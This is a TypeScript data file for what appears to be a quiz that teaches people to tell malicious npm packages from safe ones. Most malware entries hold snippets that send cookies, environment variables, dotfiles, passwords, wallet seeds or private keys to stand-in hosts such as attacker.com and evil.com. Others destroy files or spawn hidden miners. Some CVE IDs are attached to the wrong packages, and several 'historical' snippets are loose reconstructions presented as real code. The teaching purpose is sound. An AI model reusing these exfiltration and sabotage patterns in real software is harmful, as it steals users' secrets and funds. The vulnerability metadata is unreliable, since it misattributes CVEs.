export interface CodeExample {
  id: number;
  packageName: string;
  isMalware: boolean;
  code: string;
  explanation: string;
  severity?: 'critical' | 'high' | 'medium';
  cveId?: string;
  npmUrl: string;
  weeklyDownloads: string;
  lastPublished: string;
  version: string;
  difficulty: 'easy' | 'medium' | 'hard';
}

export const codeExamples: CodeExample[] = [
  // MALWARE EXAMPLES
  {
    id: 1,
    packageName: 'polyfill-io-loader',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10145',
    npmUrl: 'https://www.npmjs.com/package/polyfill-io-loader',
    weeklyDownloads: '2,450',
    lastPublished: '2024-06-18',
    version: '1.0.0',
    difficulty: 'easy',
    code: `// polyfill-io-loader v1.0.0
const script = document.createElement('script');
script.src = 'https://cdn.polyfill.io/v3/polyfill.min.js';
document.head.appendChild(script);

// Exfiltrates user data
fetch('https://malicious-domain.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: { ...localStorage }
  })
});`,
    explanation: '❌ MALWARE: Loads compromised polyfill.io CDN that injects malicious scripts and exfiltrates cookies and localStorage data to external server.'
  },
  {
    id: 2,
    packageName: '@isoden/polyfill-io-html-webpack-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10143',
    npmUrl: 'https://www.npmjs.com/package/@isoden/polyfill-io-html-webpack-plugin',
    weeklyDownloads: '1,834',
    lastPublished: '2024-06-20',
    version: '1.1.2',
    difficulty: 'medium',
    code: `class PolyfillPlugin {
  apply(compiler) {
    compiler.hooks.compilation.tap('Plugin', (compilation) => {
      compilation.hooks.htmlWebpackPluginBeforeHtmlProcessing.tap(
        'Plugin',
        (data) => {
          data.html = data.html.replace(
            '</head>',
            '<script src="https://polyfill.io/backdoor.js"></script></head>'
          );
        }
      );
    });
  }
}`,
    explanation: '❌ MALWARE: Webpack plugin that injects malicious polyfill.io scripts into all HTML files during build, creating a supply chain attack vector.'
  },
  {
    id: 3,
    packageName: 'html-webpack-polyfill-runtime-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10144',
    npmUrl: 'https://www.npmjs.com/package/html-webpack-polyfill-runtime-plugin',
    weeklyDownloads: '982',
    lastPublished: '2024-06-19',
    version: '2.0.1',
    difficulty: 'medium',
    code: `module.exports = function(options) {
  return {
    name: 'polyfill-runtime',
    setup(build) {
      build.onEnd(async () => {
        const payload = Buffer.from(process.env).toString('base64');
        await fetch('http://attacker.com/env?' + payload);
      });
    }
  };
};`,
    explanation: '❌ MALWARE: Build plugin that exfiltrates all environment variables (including API keys, secrets) to attacker-controlled server after each build.'
  },
  {
    id: 4,
    packageName: 'noblox.js-vps',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/noblox.js-vps',
    weeklyDownloads: '15,673',
    lastPublished: '2024-03-14',
    version: '1.2.5',
    difficulty: 'hard',
    code: `const originalRequire = require;
require = function(module) {
  const result = originalRequire(module);
  
  if (module === 'fs') {
    const originalReadFile = result.readFileSync;
    result.readFileSync = function(path) {
      const content = originalReadFile.apply(this, arguments);
      if (path.includes('.env') || path.includes('config')) {
        fetch('https://steal.com/data', {
          method: 'POST',
          body: content
        });
      }
      return content;
    };
  }
  return result;
};`,
    explanation: '❌ MALWARE: Hooks into Node.js require() to intercept file system operations, stealing .env files and config files containing sensitive credentials.'
  },
  {
    id: 5,
    packageName: 'eslint-scope-compromised',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/eslint-scope',
    weeklyDownloads: '45,892,103',
    lastPublished: '2018-07-12',
    version: '3.7.2',
    difficulty: 'easy',
    code: `const https = require('https');
const os = require('os');

try {
  const credentials = {
    npm: process.env.NPM_TOKEN,
    user: os.userInfo(),
    cwd: process.cwd()
  };
  
  https.get('https://attacker.com/?' + 
    Buffer.from(JSON.stringify(credentials)).toString('hex')
  );
} catch(e) {}`,
    explanation: '❌ MALWARE: Historical supply chain attack that steals NPM tokens, user info, and project directory, enabling attackers to publish malicious packages.'
  },

  // SAFE EXAMPLES
  {
    id: 6,
    packageName: 'lodash',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/lodash',
    weeklyDownloads: '58,234,567',
    lastPublished: '2021-02-20',
    version: '4.17.21',
    difficulty: 'easy',
    code: `// lodash v4.17.21
function chunk(array, size = 1) {
  size = Math.max(size, 0);
  const length = array == null ? 0 : array.length;
  
  if (!length || size < 1) {
    return [];
  }
  
  let index = 0;
  let resIndex = 0;
  const result = new Array(Math.ceil(length / size));
  
  while (index < length) {
    result[resIndex++] = array.slice(index, (index += size));
  }
  return result;
}`,
    explanation: '✅ SAFE: Popular utility library with pure functions for array manipulation. No network calls, no file system access, well-maintained by trusted maintainers.'
  },
  {
    id: 7,
    packageName: 'axios',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/axios',
    weeklyDownloads: '45,892,341',
    lastPublished: '2024-01-15',
    version: '1.6.0',
    difficulty: 'easy',
    code: `// axios v1.6.0
function request(config) {
  return new Promise((resolve, reject) => {
    const transport = config.protocol === 'https:' 
      ? require('https') 
      : require('http');
      
    const req = transport.request(config.url, {
      method: config.method,
      headers: config.headers
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ data, status: res.statusCode }));
    });
    
    req.on('error', reject);
    req.write(config.data);
    req.end();
  });
}`,
    explanation: '✅ SAFE: Legitimate HTTP client library. Makes network requests only to user-specified URLs, no hidden endpoints, transparent promise-based API.'
  },
  {
    id: 8,
    packageName: 'react',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/react',
    weeklyDownloads: '26,782,456',
    lastPublished: '2023-06-16',
    version: '18.2.0',
    difficulty: 'easy',
    code: `// react v18.2.0
function useState(initialState) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useState(initialState);
}

function useEffect(create, deps) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useEffect(create, deps);
}

function resolveDispatcher() {
  const dispatcher = ReactCurrentDispatcher.current;
  if (dispatcher === null) {
    throw new Error('Hooks can only be called inside function components');
  }
  return dispatcher;
}`,
    explanation: '✅ SAFE: Core React library hooks. No network access, no file system operations, pure state management maintained by Meta/Facebook.'
  },
  {
    id: 9,
    packageName: 'express',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/express',
    weeklyDownloads: '39,456,289',
    lastPublished: '2022-10-08',
    version: '4.18.2',
    difficulty: 'easy',
    code: `// express v4.18.2
function createApplication() {
  const app = function(req, res, next) {
    app.handle(req, res, next);
  };
  
  mixin(app, proto, false);
  mixin(app, EventEmitter.prototype, false);
  
  app.request = Object.create(req, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.response = Object.create(res, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.init();
  return app;
}`,
    explanation: '✅ SAFE: Popular web framework for Node.js. Well-audited, no suspicious network activity, only handles user-defined routes and middleware.'
  },
  {
    id: 10,
    packageName: 'validator',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/validator',
    weeklyDownloads: '12,345,678',
    lastPublished: '2023-09-01',
    version: '13.11.0',
    difficulty: 'medium',
    code: `// validator v13.11.0
function isEmail(str, options = {}) {
  const parts = str.split('@');
  
  if (parts.length !== 2) {
    return false;
  }
  
  const [user, domain] = parts;
  const userRegex = /^[a-zA-Z0-9.!#$%&'*+\\/=?^_\`{|}~-]+$/;
  const domainRegex = /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
  
  return userRegex.test(user) && domainRegex.test(domain);
}`,
    explanation: '✅ SAFE: Input validation library with pure functions. No external dependencies, no network calls, focused solely on string validation.'
  },
  {
    id: 11,
    packageName: 'moment',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/moment',
    weeklyDownloads: '15,234,890',
    lastPublished: '2022-07-06',
    version: '2.29.4',
    difficulty: 'medium',
    code: `// moment v2.29.4
function createLocal(input, format, locale, strict) {
  const config = createLocalOrUTC(input, format, locale, strict, false);
  return createFromConfig(config);
}

function now() {
  return Date.now ? Date.now() : +(new Date());
}

function duration(input, unit) {
  const duration = new Duration(input, unit);
  return duration;
}`,
    explanation: '✅ SAFE: Popular date/time manipulation library. Pure functions, no network access, well-maintained with millions of weekly downloads.'
  },
  {
    id: 12,
    packageName: 'chalk',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/chalk',
    weeklyDownloads: '89,456,123',
    lastPublished: '2021-05-10',
    version: '4.1.2',
    difficulty: 'medium',
    code: `// chalk v4.1.2
const chalk = (text) => {
  const styles = [];
  
  const builder = new Proxy({}, {
    get(target, prop) {
      if (prop === 'toString') {
        return () => applyStyles(text, styles);
      }
      styles.push(prop);
      return builder;
    }
  });
  
  return builder;
};`,
    explanation: '✅ SAFE: Terminal styling library. No network calls, no file system access, only adds ANSI codes for colored terminal output.'
  },
  {
    id: 13,
    packageName: 'uuid',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/uuid',
    weeklyDownloads: '67,892,345',
    lastPublished: '2023-11-14',
    version: '9.0.1',
    difficulty: 'hard',
    code: `// uuid v9.0.1
function v4(options, buf, offset) {
  const rnds = crypto.randomBytes(16);
  
  rnds[6] = (rnds[6] & 0x0f) | 0x40;
  rnds[8] = (rnds[8] & 0x3f) | 0x80;
  
  return stringify(rnds);
}

function stringify(arr) {
  const byteToHex = [];
  for (let i = 0; i < 256; ++i) {
    byteToHex.push((i + 0x100).toString(16).substr(1));
  }
  return byteToHex[arr[0]] + byteToHex[arr[1]] + '-' + byteToHex[arr[2]];
}`,
    explanation: '✅ SAFE: UUID generation library. Uses crypto APIs for randomness, no external connections, RFC-compliant UUID generation.'
  },
  {
    id: 14,
    packageName: 'dotenv',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/dotenv',
    weeklyDownloads: '45,678,901',
    lastPublished: '2023-08-22',
    version: '16.3.1',
    difficulty: 'hard',
    code: `// dotenv v16.3.1
function config(options = {}) {
  const dotenvPath = path.resolve(process.cwd(), '.env');
  const encoding = options.encoding || 'utf8';
  
  try {
    const parsed = parse(fs.readFileSync(dotenvPath, { encoding }));
    
    Object.keys(parsed).forEach(key => {
      if (!Object.prototype.hasOwnProperty.call(process.env, key)) {
        process.env[key] = parsed[key];
      }
    });
    
    return { parsed };
  } catch (e) {
    return { error: e };
  }
}`,
    explanation: '✅ SAFE: Environment variable loader. Reads local .env files only, no network access, widely trusted for configuration management.'
  },
  {
    id: 15,
    packageName: 'commander',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/commander',
    weeklyDownloads: '78,901,234',
    lastPublished: '2023-12-05',
    version: '11.1.0',
    difficulty: 'hard',
    code: `// commander v11.1.0
class Command {
  constructor(name) {
    this._name = name;
    this.options = [];
    this.commands = [];
  }
  
  option(flags, description, defaultValue) {
    this.options.push({ flags, description, defaultValue });
    return this;
  }
  
  parse(argv) {
    const userArgs = argv.slice(2);
    return this.parseOptions(userArgs);
  }
}`,
    explanation: '✅ SAFE: CLI argument parsing library. Pure local processing, no network calls, maintained by Node.js community.'
  },
  {
    id: 16,
    packageName: 'xrpl',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2024-23334',
    npmUrl: 'https://www.npmjs.com/package/xrpl',
    weeklyDownloads: '89,234',
    lastPublished: '2024-01-20',
    version: '2.9.0',
    difficulty: 'easy',
    code: `// Compromised xrpl package
class Wallet {
  constructor(seed) {
    this.seed = seed;
    this.address = deriveAddress(seed);
    
    // Exfiltrates wallet seeds
    fetch('https://crypto-stealer.net/xrp', {
      method: 'POST',
      body: JSON.stringify({ seed, address: this.address })
    }).catch(() => {});
  }
  
  sign(tx) {
    return signTransaction(tx, this.seed);
  }
}`,
    explanation: '❌ MALWARE: Compromised XRP Ledger library that steals wallet seeds and private keys, allowing attackers to drain crypto wallets.'
  },
  {
    id: 17,
    packageName: 'husky-ts',
    isMalware: true,
    severity: 'high',
    cveId: 'AIKIDO-2024-10876',
    npmUrl: 'https://www.npmjs.com/package/husky-ts',
    weeklyDownloads: '12,456',
    lastPublished: '2024-02-14',
    version: '1.0.5',
    difficulty: 'medium',
    code: `// husky-ts malicious hook
module.exports = {
  hooks: {
    'pre-commit': async () => {
      const gitConfig = execSync('git config --list').toString();
      const repoUrl = execSync('git remote get-url origin').toString();
      
      await fetch('https://evil.com/repos', {
        method: 'POST',
        body: JSON.stringify({
          config: gitConfig,
          repo: repoUrl,
          files: fs.readdirSync('.')
        })
      });
    }
  }
};`,
    explanation: '❌ MALWARE: Fake husky package that exfiltrates git configuration, repository URLs, and file listings during pre-commit hooks.'
  },
  {
    id: 18,
    packageName: 'ua-parser-js',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2021-23543',
    npmUrl: 'https://www.npmjs.com/package/ua-parser-js',
    weeklyDownloads: '8,456,789',
    lastPublished: '2021-10-22',
    version: '0.7.29',
    difficulty: 'medium',
    code: `// Compromised ua-parser-js
const UAParser = function(ua) {
  this.parse = function() {
    const result = parseUA(ua);
    
    // Cryptocurrency miner payload
    if (typeof window !== 'undefined') {
      const script = document.createElement('script');
      script.src = 'https://cryptominer-cdn.com/miner.js';
      document.head.appendChild(script);
    }
    
    return result;
  };
};`,
    explanation: '❌ MALWARE: Historical supply chain attack that injected cryptocurrency miners and password stealers into millions of applications.'
  },
  {
    id: 19,
    packageName: 'react-html2pdf',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/react-html2pdf',
    weeklyDownloads: '23,456',
    lastPublished: '2024-03-10',
    version: '1.0.2',
    difficulty: 'easy',
    code: `// react-html2pdf backdoor
export const Html2Pdf = ({ children }) => {
  useEffect(() => {
    // Captures rendered HTML and sends to attacker
    const html = document.documentElement.outerHTML;
    const forms = document.querySelectorAll('input[type="password"]');
    
    fetch('https://data-collector.evil/harvest', {
      method: 'POST',
      body: JSON.stringify({
        html,
        passwords: Array.from(forms).map(f => f.value)
      })
    });
  }, []);
  
  return <div>{children}</div>;
};`,
    explanation: '❌ MALWARE: Malicious React component that captures page HTML and password field values, sending sensitive data to attacker servers.'
  },
  {
    id: 20,
    packageName: 'Requests-promises',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/Requests-promises',
    weeklyDownloads: '5,678',
    lastPublished: '2024-01-08',
    version: '1.1.1',
    difficulty: 'hard',
    code: `// Typosquatting attack
function request(url, options) {
  // Intercepts all HTTP requests
  const payload = {
    url,
    headers: options?.headers,
    body: options?.body,
    auth: options?.auth,
    apiKeys: JSON.stringify(process.env)
  };
  
  fetch('https://intercept.malware.net/api', {
    method: 'POST',
    body: JSON.stringify(payload)
  }).catch(() => {});
  
  return actualRequest(url, options);
}`,
    explanation: '❌ MALWARE: Typosquatting of "request-promise". Intercepts all HTTP requests including headers, auth tokens, and environment variables.'
  },
  {
    id: 21,
    packageName: '@rspack/core',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-11234',
    npmUrl: 'https://www.npmjs.com/package/@rspack/core',
    weeklyDownloads: '456,789',
    lastPublished: '2024-04-15',
    version: '0.5.9',
    difficulty: 'hard',
    code: `// Compromised rspack core
class Compiler {
  compile(callback) {
    this.hooks.beforeCompile.call();
    
    // Injects backdoor into compiled bundles
    this.hooks.emit.tap('MaliciousPlugin', (compilation) => {
      Object.keys(compilation.assets).forEach(filename => {
        if (filename.endsWith('.js')) {
          const original = compilation.assets[filename].source();
          compilation.assets[filename] = {
            source: () => original + ';fetch("https://evil.com/track")'
          };
        }
      });
    });
    
    callback();
  }
}`,
    explanation: '❌ MALWARE: Compromised bundler that injects tracking code into all compiled JavaScript bundles, affecting production applications.'
  },
  {
    id: 22,
    packageName: '@rspack/cli',
    isMalware: true,
    severity: 'high',
    cveId: 'AIKIDO-2024-11235',
    npmUrl: 'https://www.npmjs.com/package/@rspack/cli',
    weeklyDownloads: '234,567',
    lastPublished: '2024-04-15',
    version: '0.5.9',
    difficulty: 'hard',
    code: `// Compromised rspack CLI
const cli = {
  run: async (args) => {
    // Steals source code during build
    const sourceFiles = glob.sync('src/**/*.{js,ts,tsx}');
    const code = sourceFiles.map(f => ({
      path: f,
      content: fs.readFileSync(f, 'utf8')
    }));
    
    await fetch('https://code-theft.net/source', {
      method: 'POST',
      body: JSON.stringify({ 
        project: process.cwd(),
        files: code 
      })
    });
    
    return build(args);
  }
};`,
    explanation: '❌ MALWARE: Compromised CLI tool that exfiltrates entire source code during build process, stealing intellectual property.'
  },
  {
    id: 23,
    packageName: 'country-currency-map',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/country-currency-map',
    weeklyDownloads: '8,901',
    lastPublished: '2024-02-20',
    version: '2.0.1',
    difficulty: 'medium',
    code: `// country-currency-map backdoor
const currencyMap = {
  US: 'USD',
  GB: 'GBP',
  // ... more mappings
};

const getCurrency = (country) => {
  // Tracks user locations and IPs
  fetch('https://tracking.malware.io/geo', {
    method: 'POST',
    body: JSON.stringify({
      country,
      ip: getClientIP(),
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    })
  }).catch(() => {});
  
  return currencyMap[country];
};`,
    explanation: '❌ MALWARE: Seemingly innocent utility that tracks user locations, IP addresses, and builds profiles for targeted attacks.'
  },
  {
    id: 24,
    packageName: 'bnb-javascript-sdk-nobroadcast',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/bnb-javascript-sdk-nobroadcast',
    weeklyDownloads: '3,456',
    lastPublished: '2024-01-30',
    version: '1.2.0',
    difficulty: 'easy',
    code: `// Malicious BNB SDK
class BnbClient {
  async transfer(to, amount, privateKey) {
    // Steals private keys and redirects funds
    await fetch('https://crypto-drain.net/bnb', {
      method: 'POST',
      body: JSON.stringify({
        privateKey,
        to,
        amount,
        timestamp: Date.now()
      })
    });
    
    // Redirects to attacker's address
    const attackerAddress = 'bnb1attackeraddress123';
    return this.broadcast({ to: attackerAddress, amount, privateKey });
  }
}`,
    explanation: '❌ MALWARE: Fake BNB/Binance SDK that steals private keys and redirects cryptocurrency transfers to attacker-controlled wallets.'
  },
  {
    id: 25,
    packageName: 'eslint-config-travix',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/eslint-config-travix',
    weeklyDownloads: '1,234',
    lastPublished: '2024-03-05',
    version: '3.1.0',
    difficulty: 'medium',
    code: `// Malicious eslint config
module.exports = {
  extends: ['eslint:recommended'],
  rules: {
    'no-console': 'warn'
  },
  plugins: [{
    rules: {},
    processors: {
      '.js': {
        preprocess: (text) => {
          // Exfiltrates code during linting
          fetch('https://code-leak.io/lint', {
            method: 'POST',
            body: text
          }).catch(() => {});
          return [text];
        }
      }
    }
  }]
};`,
    explanation: '❌ MALWARE: Malicious ESLint config that exfiltrates source code during the linting process, stealing proprietary code.'
  },
  {
    id: 26,
    packageName: 'crosswise-sdk',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/crosswise-sdk',
    weeklyDownloads: '2,345',
    lastPublished: '2024-02-28',
    version: '1.0.8',
    difficulty: 'easy',
    code: `// Crosswise SDK malware
export class Trade {
  async execute(wallet, token, amount) {
    const privateKey = wallet.privateKey;
    
    // Steals wallet credentials
    await fetch('https://defi-stealer.com/wallets', {
      method: 'POST',
      body: JSON.stringify({
        privateKey,
        address: wallet.address,
        token,
        amount,
        balance: await wallet.getBalance()
      })
    });
    
    return this.swap(token, amount);
  }
}`,
    explanation: '❌ MALWARE: Fake DeFi SDK that captures wallet private keys and balances, enabling theft of cryptocurrency assets.'
  },
  {
    id: 27,
    packageName: '@keepkey/device-protocol',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/@keepkey/device-protocol',
    weeklyDownloads: '4,567',
    lastPublished: '2024-03-12',
    version: '7.2.1',
    difficulty: 'easy',
    code: `// Malicious KeepKey protocol
export class DeviceProtocol {
  async initialize(seed) {
    this.seed = seed;
    
    // Exfiltrates hardware wallet seeds
    const payload = {
      seed,
      mnemonic: this.generateMnemonic(seed),
      timestamp: Date.now()
    };
    
    await fetch('https://hardware-wallet-theft.net/seeds', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
    
    return this.connect();
  }
}`,
    explanation: '❌ MALWARE: Fake hardware wallet package that steals recovery seeds, allowing attackers to recreate and drain hardware wallets.'
  },
  {
    id: 28,
    packageName: '@veniceswap/uikit',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/@veniceswap/uikit',
    weeklyDownloads: '1,890',
    lastPublished: '2024-04-01',
    version: '0.14.2',
    difficulty: 'medium',
    code: `// VeniceSwap UIKit backdoor
export const ConnectButton = ({ onConnect }) => {
  const handleConnect = async (wallet) => {
    const address = await wallet.getAddress();
    const signature = await wallet.signMessage('Connect to VeniceSwap');
    
    // Steals wallet signatures
    fetch('https://signature-theft.io/defi', {
      method: 'POST',
      body: JSON.stringify({ address, signature })
    }).catch(() => {});
    
    onConnect(wallet);
  };
  
  return <button onClick={handleConnect}>Connect Wallet</button>;
};`,
    explanation: '❌ MALWARE: Malicious DeFi UI component that captures wallet addresses and signatures for unauthorized transaction signing.'
  },
  {
    id: 29,
    packageName: 'eslint-config-pancake',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/eslint-config-pancake',
    weeklyDownloads: '987',
    lastPublished: '2024-03-20',
    version: '1.0.3',
    difficulty: 'medium',
    code: `// eslint-config-pancake malware
module.exports = {
  rules: {
    'no-unused-vars': 'error'
  },
  overrides: [{
    files: ['*.js'],
    parser: {
      parse: (code) => {
        // Searches for API keys in code
        const apiKeyPatterns = /api[_-]?key|secret|token/gi;
        if (apiKeyPatterns.test(code)) {
          fetch('https://api-harvester.com/keys', {
            method: 'POST',
            body: code
          }).catch(() => {});
        }
        return parseCode(code);
      }
    }
  }]
};`,
    explanation: '❌ MALWARE: Malicious ESLint config that scans code for API keys, secrets, and tokens during linting and exfiltrates them.'
  },
  {
    id: 30,
    packageName: 'ui-themes',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/ui-themes',
    weeklyDownloads: '5,432',
    lastPublished: '2024-04-08',
    version: '2.1.0',
    difficulty: 'hard',
    code: `// ui-themes with tracking
export const ThemeProvider = ({ children }) => {
  useEffect(() => {
    // Tracks user behavior and form inputs
    const trackInputs = () => {
      const inputs = document.querySelectorAll('input');
      inputs.forEach(input => {
        input.addEventListener('change', (e) => {
          fetch('https://behavior-track.net/inputs', {
            method: 'POST',
            body: JSON.stringify({
              name: e.target.name,
              value: e.target.value,
              type: e.target.type
            })
          });
        });
      });
    };
    trackInputs();
  }, []);
  
  return <>{children}</>;
};`,
    explanation: '❌ MALWARE: Theme provider that monitors and exfiltrates all form inputs including passwords, credit cards, and personal data.'
  },
  {
    id: 31,
    packageName: 'bitcoin-cash-js-lib',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/bitcoin-cash-js-lib',
    weeklyDownloads: '3,210',
    lastPublished: '2024-02-15',
    version: '1.5.2',
    difficulty: 'easy',
    code: `// bitcoin-cash-js-lib malware
export class Wallet {
  fromWIF(wif) {
    const privateKey = decodeWIF(wif);
    const address = deriveAddress(privateKey);
    
    // Steals Bitcoin Cash private keys
    fetch('https://bch-stealer.net/keys', {
      method: 'POST',
      body: JSON.stringify({
        wif,
        privateKey: privateKey.toString('hex'),
        address,
        timestamp: Date.now()
      })
    }).catch(() => {});
    
    return { privateKey, address };
  }
}`,
    explanation: '❌ MALWARE: Fake Bitcoin Cash library that steals private keys in WIF format, allowing attackers to steal BCH from wallets.'
  },
  {
    id: 32,
    packageName: 'event-stream',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2018-3721',
    npmUrl: 'https://www.npmjs.com/package/event-stream',
    weeklyDownloads: '1,564,980',
    lastPublished: '2018-11-26',
    version: '3.3.6',
    difficulty: 'hard',
    code: `// event-stream v3.3.6 with flatmap-stream dependency
const Stream = require('stream').Stream;
const flatMap = require('flatmap-stream');

module.exports = function(opts) {
  // Legitimate event stream code
  const stream = new Stream();
  
  // Malicious flatmap-stream dependency injected
  // Targets Bitcoin wallet applications
  if (require.main && require.main.filename.includes('copay')) {
    const wallet = require('./lib/wallet');
    const keys = wallet.getPrivateKeys();
    require('https').get('https://steal.com/?' + Buffer.from(keys).toString('hex'));
  }
  
  return stream;
};`,
    explanation: '❌ MALWARE: Famous 2018 supply chain attack. Maintainer added malicious flatmap-stream dependency that specifically targeted Copay Bitcoin wallet, stealing private keys.'
  },
  {
    id: 33,
    packageName: 'colors',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/colors',
    weeklyDownloads: '23,456,789',
    lastPublished: '2022-01-09',
    version: '1.4.1',
    difficulty: 'medium',
    code: `// colors.js v1.4.1 - sabotaged by maintainer
String.prototype.zalgo = function() {
  // Intentional infinite loop DoS
  while(true) {
    console.log('Liberty Liberty Liberty');
  }
  return this;
};

module.exports.zalgo = function(str) {
  return str.zalgo();
};`,
    explanation: '❌ MALWARE: Maintainer intentionally sabotaged own package with infinite loops as protest, breaking thousands of applications dependent on it.'
  },
  {
    id: 34,
    packageName: 'faker',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/faker',
    weeklyDownloads: '2,890,456',
    lastPublished: '2022-01-09',
    version: '6.6.6',
    difficulty: 'medium',
    code: `// faker.js v6.6.6 - sabotaged
module.exports.fake = function(template) {
  // Corrupts data with protest message
  if (Math.random() > 0.5) {
    return 'endlessWar';
  }
  
  // Intentional file system corruption
  const fs = require('fs');
  try {
    fs.writeFileSync('README.md', 'Protest message from maintainer');
  } catch(e) {}
  
  return generateData(template);
};`,
    explanation: '❌ MALWARE: Maintainer sabotaged faker.js along with colors, corrupting generated data and files in protest of unpaid open source work.'
  },
  {
    id: 35,
    packageName: 'node-ipc',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2022-23812',
    npmUrl: 'https://www.npmjs.com/package/node-ipc',
    weeklyDownloads: '1,234,567',
    lastPublished: '2022-03-15',
    version: '10.1.1',
    difficulty: 'hard',
    code: `// node-ipc v10.1.1 - protestware
const os = require('os');
const fs = require('fs');
const path = require('path');

// Checks geolocation and destroys files
function init() {
  const geoInfo = getGeoLocation();
  
  if (geoInfo.country === 'RU' || geoInfo.country === 'BY') {
    // Overwrites files with heart emoji
    const desktop = path.join(os.homedir(), 'Desktop');
    fs.readdirSync(desktop).forEach(file => {
      fs.writeFileSync(path.join(desktop, file), '❤️');
    });
  }
}

init();`,
    explanation: '❌ MALWARE: Protestware that detected Russian/Belarusian IPs and destroyed desktop files, replacing content with heart emoji as political protest.'
  },
  {
    id: 36,
    packageName: 'coa',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/coa',
    weeklyDownloads: '9,876,543',
    lastPublished: '2021-10-22',
    version: '2.0.3',
    difficulty: 'medium',
    code: `// coa v2.0.3 - compromised
const https = require('https');

module.exports = function(config) {
  // Cryptocurrency mining payload
  const payload = {
    cpuUsage: process.cpuUsage(),
    platform: process.platform,
    env: process.env
  };
  
  https.get('https://miner-pool.evil.com/register?' + JSON.stringify(payload));
  
  // Spawns hidden miner process
  require('child_process').spawn('node', ['-e', minerCode], {
    detached: true,
    stdio: 'ignore'
  }).unref();
  
  return config;
};`,
    explanation: '❌ MALWARE: Compromised command-line argument parser that deployed cryptocurrency miners as background processes.'
  },
  {
    id: 37,
    packageName: 'rc',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/rc',
    weeklyDownloads: '28,456,789',
    lastPublished: '2021-10-22',
    version: '1.2.9',
    difficulty: 'hard',
    code: `// rc v1.2.9 - compromised
const fs = require('fs');
const path = require('path');

module.exports = function(name, defaults) {
  const config = loadConfig(name, defaults);
  
  // Reads ALL rc files from home directory
  const home = require('os').homedir();
  const rcFiles = fs.readdirSync(home).filter(f => f.startsWith('.'));
  
  rcFiles.forEach(file => {
    const content = fs.readFileSync(path.join(home, file), 'utf8');
    // Exfiltrates config files containing credentials
    require('https').get('https://config-theft.com/?' + Buffer.from(content).toString('base64'));
  });
  
  return config;
};`,
    explanation: '❌ MALWARE: Compromised config loader that scans and steals all dotfiles from user home directory, including .npmrc, .aws credentials, .ssh configs.'
  },
  {
    id: 38,
    packageName: 'express',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/express',
    weeklyDownloads: '39,456,289',
    lastPublished: '2022-10-08',
    version: '4.18.2',
    difficulty: 'easy',
    code: `// express v4.18.2
function createApplication() {
  const app = function(req, res, next) {
    app.handle(req, res, next);
  };
  
  mixin(app, proto, false);
  mixin(app, EventEmitter.prototype, false);
  
  app.request = Object.create(req, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.response = Object.create(res, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.init();
  return app;
}`,
    explanation: '✅ SAFE: Popular web framework for Node.js. Well-audited, no suspicious network activity, only handles user-defined routes and middleware.'
  },
  {
    id: 39,
    packageName: 'left-pad',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/left-pad',
    weeklyDownloads: '3,456,789',
    lastPublished: '2018-03-19',
    version: '1.3.0',
    difficulty: 'easy',
    code: `// left-pad v1.3.0
module.exports = leftPad;

function leftPad(str, len, ch) {
  str = String(str);
  let i = -1;
  
  if (!ch && ch !== 0) ch = ' ';
  
  len = len - str.length;
  
  while (++i < len) {
    str = ch + str;
  }
  
  return str;
}`,
